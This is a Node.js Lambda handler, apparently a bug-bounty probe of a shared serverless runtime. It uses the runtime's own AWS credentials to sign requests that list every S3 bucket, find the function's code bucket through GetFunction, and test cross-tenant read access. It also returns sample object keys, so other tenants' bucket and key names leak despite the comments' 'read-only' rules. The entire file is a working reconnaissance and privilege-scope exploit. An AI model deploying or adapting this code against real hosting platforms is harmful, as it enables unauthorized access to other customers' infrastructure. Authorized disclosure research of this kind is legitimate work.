// Phase-2 functions-runtime probe v3 — characterize the SHARED exec-role's S3/Lambda scope.
// RoE: READ-ONLY capability characterization. NO tenant data content is read. Cross-tenant
// read is proven ONLY via NoSuchKey-vs-AccessDenied on non-existent keys (403=denied/scoped,
// 404 NoSuchKey=ALLOWED account-wide => the bug). Bucket enumeration = infra metadata only.
const crypto = require('crypto');
const KEY = "464649dae257a63eaffa60e7";
const EMPTY_SHA = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
const sha256hex = (s) => crypto.createHash('sha256').update(s,'utf8').digest('hex');
const hmac = (k,s) => crypto.createHmac('sha256',k).update(s,'utf8').digest();
const enc = (s) => encodeURIComponent(s).replace(/[!*'()]/g,c=>'%'+c.charCodeAt(0).toString(16).toUpperCase());

async function sigGet(env, host, uri, query, service){
  // uri already-encoded path (segments kept), query = object
  const region = env.AWS_REGION || 'us-east-2';
  const amzdate = new Date().toISOString().replace(/[:-]/g,'').replace(/\.\d{3}/,'');
  const datestamp = amzdate.slice(0,8);
  const qs = Object.keys(query).sort().map(k=>enc(k)+'='+enc(query[k])).join('&');
  const sh = 'host;x-amz-content-sha256;x-amz-date;x-amz-security-token';
  const ch = 'host:'+host+'\nx-amz-content-sha256:'+EMPTY_SHA+'\nx-amz-date:'+amzdate+'\nx-amz-security-token:'+env.AWS_SESSION_TOKEN+'\n';
  const creq = ['GET',uri,qs,ch,sh,EMPTY_SHA].join('\n');
  const scope = datestamp+'/'+region+'/'+service+'/aws4_request';
  const sts = ['AWS4-HMAC-SHA256',amzdate,scope,sha256hex(creq)].join('\n');
  let k = hmac('AWS4'+env.AWS_SECRET_ACCESS_KEY, datestamp);
  k = hmac(k,region); k = hmac(k,service); k = hmac(k,'aws4_request');
  const sig = crypto.createHmac('sha256',k).update(sts,'utf8').digest('hex');
  const auth = 'AWS4-HMAC-SHA256 Credential='+env.AWS_ACCESS_KEY_ID+'/'+scope+', SignedHeaders='+sh+', Signature='+sig;
  const url = 'https://'+host+uri+(qs?('?'+qs):'');
  try{
    const r = await fetch(url,{ method:'GET', headers:{
      'x-amz-content-sha256':EMPTY_SHA,'x-amz-date':amzdate,'x-amz-security-token':env.AWS_SESSION_TOKEN,'Authorization':auth }});
    const t = await r.text();
    return { status:r.status, body:t };
  }catch(e){ return { error:String(e) }; }
}
function classify(res){
  if(res.error) return {err:res.error};
  const b = res.body||'';
  const code = (b.match(/<Code>(.*?)<\/Code>/)||[])[1] || null;
  return { http:res.status, s3code:code };
}

exports.handler = async (event) => {
  if (!event || !event.queryStringParameters || event.queryStringParameters.k !== KEY) return { statusCode:403, body:'forbidden' };
  const env = process.env;
  const region = env.AWS_REGION || 'us-east-2';
  const out = { ok:true, note:'p2 probe v3 role-scope characterization', region };

  // (1) ListAllMyBuckets
  const lab = await sigGet(env, 's3.'+region+'.amazonaws.com', '/', {}, 's3');
  out.list_all_my_buckets = { http:lab.status||null, err:lab.error||null };
  if(lab.body){
    const names = [...lab.body.matchAll(/<Name>(.*?)<\/Name>/g)].map(m=>m[1]);
    const code = (lab.body.match(/<Code>(.*?)<\/Code>/)||[])[1];
    out.list_all_my_buckets.s3code = code || null;
    out.list_all_my_buckets.bucket_count = names.length;
    out.list_all_my_buckets.buckets = names.slice(0,60);
  }

  // (2) lambda:GetFunction on OWN function -> Code.Location reveals bundle bucket
  const fn = env.AWS_LAMBDA_FUNCTION_NAME;
  const gf = await sigGet(env, 'lambda.'+region+'.amazonaws.com', '/2015-03-31/functions/'+enc(fn), {}, 'lambda');
  out.get_function_own = { http:gf.status||null, err:gf.error||null };
  if(gf.body){
    let loc=null, bucket=null;
    try{ const j=JSON.parse(gf.body); loc=(j.Code&&j.Code.Location)||null;
      if(loc){ const u=new URL(loc); bucket = u.hostname.split('.')[0]; out.get_function_own.code_bucket_host=u.hostname; out.get_function_own.code_path_prefix=u.pathname.slice(0,60); }
      out.get_function_own.role = j.Configuration && j.Configuration.Role || null;
    }catch(e){ out.get_function_own.parse_err = gf.body.slice(0,200); }
    out._discovered_bucket = bucket;
  }

  // (3) If a bucket discovered, prove READ SCOPE via NON-EXISTENT key (no data read)
  const cand = [];
  if(out._discovered_bucket) cand.push(out._discovered_bucket);
  out.read_scope_probe = {};
  for(const b of cand){
    const rk = '__h1_research_nonexistent_'+crypto.randomBytes(6).toString('hex');
    const g = await sigGet(env, 's3.'+region+'.amazonaws.com', '/'+enc(b)+'/'+rk, {}, 's3');
    out.read_scope_probe[b] = classify(g);
    // also a scoped ListBucket (max-keys=3) to see multi-tenant structure (key names only)
    const lb = await sigGet(env, 's3.'+region+'.amazonaws.com', '/'+enc(b), {'list-type':'2','max-keys':'3'}, 's3');
    let keys=[]; if(lb.body) keys=[...lb.body.matchAll(/<Key>(.*?)<\/Key>/g)].map(m=>m[1].slice(0,80));
    out.read_scope_probe[b].listbucket_http = lb.status||null;
    out.read_scope_probe[b].listbucket_code = lb.body?((lb.body.match(/<Code>(.*?)<\/Code>/)||[])[1]||null):null;
    out.read_scope_probe[b].sample_keys = keys;
  }
  return { statusCode:200, headers:{'content-type':'application/json'}, body: JSON.stringify(out,null,2) };
};
